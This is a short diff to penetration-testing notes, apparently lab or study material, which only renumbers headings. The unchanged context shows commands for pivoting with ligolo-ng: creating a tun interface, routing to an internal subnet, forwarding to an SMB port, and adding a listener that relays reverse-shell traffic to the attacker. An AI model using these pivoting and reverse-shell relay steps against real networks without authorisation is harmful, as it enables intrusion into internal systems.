@@ -1135,7 +1135,7 @@ listen 192.168.244.7:9998 172.16.244.217:445
 ```
 4. ligolo-ng
 
-1. setting up a pivot point with ligolo-ng:
+setting up a pivot point with ligolo-ng:
 ```
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
@@ -1153,7 +1153,7 @@ ip route list
 	- should show "10.0.0.0/24 dev ligolo scope link"
 ```
 
-2. setting up reverse shells/servers on the internal network (ligolo listeners):
+setting up reverse shells/servers on the internal network (ligolo listeners):
 	- listeners on agents forward traffic out to the attacker
 ```
 listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:4444
